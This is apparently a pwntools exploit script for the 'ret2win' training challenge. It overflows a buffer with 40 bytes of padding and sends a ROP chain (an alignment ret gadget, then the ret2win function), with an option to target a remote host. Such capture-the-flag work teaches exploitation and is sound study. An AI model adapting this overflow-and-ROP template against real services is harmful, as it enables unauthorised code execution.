#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
gdbscript='''

'''.format(**locals())

exe = "./ret2win"
context.binary = elf = ELF(exe, checksec=False)
context.log_level = 'info'
rop = ROP(elf)

io = start()

rop.call(rop.find_gadget(["ret"]))
rop.call(elf.sym.ret2win)

print(rop.dump())
io.sendlineafter(b"> ", b"A"* 40 + rop.chain())


io.interactive()

